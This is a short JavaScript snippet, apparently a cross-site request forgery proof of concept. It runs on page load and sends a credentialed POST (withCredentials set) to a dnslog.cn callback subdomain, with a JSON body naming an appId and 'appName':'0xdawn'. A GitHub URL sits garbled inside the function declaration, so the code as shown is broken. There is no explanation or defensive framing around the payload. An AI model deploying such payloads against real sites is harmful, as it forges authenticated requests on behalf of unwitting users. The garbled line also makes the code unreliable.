function submitRequest()https://github.com/Ginove/post
      {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "https://11111.85ec7n.dnslog.cn", true);
        xhr.setRequestHeader("Accept", "*/*");
        xhr.setRequestHeader("Accept-Language", "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3");
        xhr.setRequestHeader("Content-Type", "application/json; charset=utf-8");
        xhr.withCredentials = true;
        xhr.send(JSON.stringify({"appId":"300016001555","appName":"0xdawn"}));
    }
	submitRequest();
